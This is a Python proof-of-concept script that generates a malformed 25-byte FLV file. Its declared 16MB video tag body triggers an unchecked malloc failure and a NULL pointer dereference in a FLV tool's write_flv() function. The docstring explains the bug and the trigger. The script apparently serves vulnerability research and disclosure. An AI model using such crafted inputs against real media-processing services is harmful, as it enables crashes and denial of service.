#!/usr/bin/env python3
"""
vuln_001_gen.py - Generate a PoC FLV file for VULN 001
CWE-476: NULL Pointer Dereference in write_flv() (update.c:103-208)

Vulnerability:
  write_flv() calls malloc(info->biggest_tag_body_size + FLV_TAG_SIZE)
  without checking the return value. If malloc fails (returns NULL),
  copy_buffer is NULL. The loop then calls:
    flv_read_tag_body(flv_in, NULL, body_length)
  which internally executes:
    fread(NULL, sizeof(byte), bytes_number, stream->flvin)
  triggering a NULL pointer dereference (SIGSEGV / ASAN null-deref).

Trigger mechanism:
  - Construct an FLV with a video tag declaring body_length = 0xFFFFFF (16MB-1)
  - biggest_tag_body_size is set from declared body_length in the first pass
  - malloc(0xFFFFFF + 11) ~ 16MB allocation is attempted in write_flv()
  - Under memory constraints (ulimit -v), this malloc fails -> NULL dereference
  - The actual file only needs 1 byte of body data; fseek handles EOF cleanly
    during the first pass (flv_read_tag uses absolute SEEK_SET to skip bodies)

FLV file layout (25 bytes total):
  [00-08] FLV header: signature(3) + version(1) + flags(1) + offset(4)
  [09-12] PreviousTagSize0: 0x00000000
  [13-23] Video tag header: type(1) + body_length(3) + ts(3) + ts_ext(1) + stream_id(3)
  [24]    Video tag body: 1 byte (video flags - frame_type=2, codec_id=2)
"""
import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.flv")

# FLV header (9 bytes)
# Signature: "FLV"
# Version: 1
# TypeFlags: 0x01 (bit0 = TypeFlagsVideo = video present)
# DataOffset: 9 (header size in bytes, big-endian uint32)
flv_header = b"FLV"
flv_header += struct.pack("B", 1)            # version
flv_header += struct.pack("B", 0x01)         # flags: video only
flv_header += struct.pack(">I", 9)           # data_offset = 9

# PreviousTagSize0 (4 bytes): must be 0 for the first tag
prev_tag_size_0 = struct.pack(">I", 0)

# Video tag header (11 bytes = FLV_TAG_SIZE)
# type: 0x09 = FLV_TAG_TYPE_VIDEO
# body_length: 3-byte big-endian = 0xFFFFFF (16777215 bytes declared)
#   -> biggest_tag_body_size will be set to 0xFFFFFF in flv_get_info() first pass
#   -> malloc(0xFFFFFF + 11) = malloc(16777226) ~ 16MB in write_flv()
# timestamp: 0x000000 (3 bytes)
# timestamp_extended: 0x00 (1 byte)
# stream_id: 0x000000 (3 bytes)
tag_type = struct.pack("B", 0x09)            # FLV_TAG_TYPE_VIDEO
body_length_3b = struct.pack(">I", 0xFFFFFF)[1:]  # 3-byte BE = b'\xff\xff\xff'
timestamp_3b = b"\x00\x00\x00"
timestamp_ext = b"\x00"
stream_id_3b = b"\x00\x00\x00"

# Video body: 1 byte (flv_read_video_tag reads this)
# Bits 7-4: frame_type = 2 (inter frame, non-keyframe)
#   -> avoids compute_video_size() call in the first pass
# Bits 3-0: codec_id = 2 (Sorenson H.263)
# value = (2 << 4) | 2 = 0x22
video_flags = struct.pack("B", 0x22)

video_tag = tag_type + body_length_3b + timestamp_3b + timestamp_ext + stream_id_3b + video_flags

# Assemble complete FLV
flv_data = flv_header + prev_tag_size_0 + video_tag

with open(OUTPUT, "wb") as f:
    f.write(flv_data)

print(f"[+] Generated {OUTPUT} ({len(flv_data)} bytes)")
print(f"[+] Video tag declared body_length: 0xFFFFFF = {0xFFFFFF} bytes (~16MB)")
print(f"[+] Actual body data in file: {len(video_flags)} byte (video flags only)")
print(f"[+] This causes biggest_tag_body_size = 0xFFFFFF in first pass")
print(f"[+] Then write_flv() calls malloc({0xFFFFFF + 11}) without NULL check")
